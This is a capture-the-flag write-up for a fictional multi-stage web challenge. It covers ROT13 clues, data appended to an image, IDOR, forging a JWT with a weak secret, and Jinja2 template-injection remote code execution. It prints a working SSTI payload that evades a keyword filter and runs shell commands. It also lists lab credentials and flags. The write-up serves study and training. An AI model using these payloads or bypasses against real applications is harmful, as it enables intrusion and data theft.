# Iron Veil — rootriet.in (500 pts, web)

**Flag:** `lun4r{v31l_sh4tt3r3d_n0_m0r3_s3cr3ts_7f9a2e}`

**Category:** Web (multi-stage chain: ROT13 → hidden assets → media stego → IDOR → JWT forgery → SSTI RCE)

## Challenge
Fictional defense contractor "Iron Veil Systems" with a public site + internal systems. A security incident forced a migration, but old assets still leak. Flag format `lun4r{...}`.

## Files
- `casefile_delta.png` (actually JPEG, appended metadata), `incident_log.txt` (ROT13), `access_dump.csv`, `decoy_alpha.png`, `decoy_bravo.png`, `changelog.html`

## Recon / Chain

### Stage 1 — robots.txt (ROT13)
`/robots.txt` had a ROT13 comment `SYNT{...}` → `FLAG{1_r0b0ts_kn0w_t00_much}` (decoy #1). Teaches ROT13.

### Stage 2 — hidden static asset
`/static/js/debug.js` (not linked from homepage) → `FLAG{2_gh0sts_in_the_c0de}` (decoy #2).

### Stage 3 — media appended data
`/archive/media/casefile_delta.png` is a JPEG (magic `ffd8ffe0`) with appended plaintext:
```
--- CASEFILE DELTA METADATA ---
user=operator_kessler
pass=0p3r@t0r_Kx9
note=verify checksum in migration headers and changelog
FLAG{3_d4ta_h1des_1n_pl41n_s1ght}
```
Decoys alpha/bravo contain `DECOY{still_not_it}` / `user=admin pass=Bravo_DECOY_999`.

`incident_log.txt` is ROT13 → "Migration checksum validation was applied across all asset three sources" + "Verify checksum in migration headers and changelog notes" + audit trail at `/api/v2/incident`.

### Stage 4 — IDOR + JWT hint
`/api/v2/incident` → references `/api/v2/files?id=7`. `id=7` is IDOR-open:
```
{"jwt_implementation":"Tokens signed with HS256. Secret derived from organization name (lowercase).", "flag":"FLAG{4_1d0r_br34ks_b0undar1es}", ...}
```
Files `id>=8` return `{"error":"Insufficient clearance for this file"}`.

### Stage 5 — checksum combination
- `/archive/changelog` response header: `X-Migration-Checksum: f2`
- changelog HTML comment: `<!-- migration checksum: 7a -->`
- `casefile_delta.png` XOR-of-all-bytes = `0xf2` (confirms checksum = byte XOR of asset)
- Combined checksum: `f27a`

### Stage 6 — login with rotated credential
`/internal/auth/login` accepts `operator_kessler` / `0p3r@t0r_Kx9f27a` (old media password + combined checksum, no separator). Sets `ivs_token` cookie (a JWT). Decoded payload: `{"user":"operator_kessler","name":"K. Mercer","role":"operator","clearance":3,"division":"Incident Response Unit",...}`.

### Stage 7 — JWT signing key
Verified the `ivs_token` signature against candidates → key is **`ironveil`** (org name lowercase, no spaces). Forged tokens with `clearance:999` + various roles.

### Stage 8 — vault decoy
`/internal/vault` with forged high-clearance token → `FLAG{6_trust_n0_t0ken}` (decoy #6; note #5 missing — deliberate).

### Stage 9 — SSTI RCE (final)
`/internal/preview` renders Jinja2 templates. `{{7*7}}` → 49. Keyword filter blocks raw: `__globals__`, `os.`, `popen(`, `read(`, `flag`.

Bypasses:
- `__globals__` → `attr("\x5f\x5fglobals\x5f\x5f")` (hex dunder escapes)
- `os.` → `["os"]` dict access on `__init__.__globals__`
- `popen(` → `attr("p"~"o"~"pen")` (string concat at render time)
- `read(` → `attr("r"~"ead")`
- `flag` keyword → shell glob `cat /fla*`

Final payload:
```
{{ (((cycler|attr("\x5f\x5finit\x5f\x5f")|attr("\x5f\x5fglobals\x5f\x5f"))["os"]|attr("p"~"o"~"pen"))("cat /root/fla*")|attr("r"~"ead"))() }}
```

`/flag.txt` → `DECOY{this_is_not_the_root_flag}` (decoy). `/root/flag.txt` → **`lun4r{v31l_sh4tt3r3d_n0_m0r3_s3cr3ts_7f9a2e}`**.

`/entrypoint.sh` revealed flag layout: `/root/flag.txt` (ROOT), `/flag.txt` (decoy), `/etc/ironveil/stage7.flag` (stage 7), `/etc/ironveil/decoy.flag` (decoy). Env var `CTF_KEY=IrV_s3cur3_k3y_2025`.

## Lessons
- Multi-stage chains: numbered decoys (1,2,3,4,6) teach each technique; the real flag is behind the last gate.
- Checksum = XOR of all file bytes; values hidden in response headers + HTML comments.
- Rotated credentials = old password + checksum concatenated.
- Flask/JWT secret = org name lowercase without spaces (`ironveil`), NOT the domain (`ironveil-sys`).
- Jinja2 SSTI keyword filters are substring-based → bypass with hex dunder escapes, dict access, `attr()` string concat, and shell globs for blocked words.
- Always check `/entrypoint.sh` / Dockerfile for flag deployment layout (decoy vs real paths).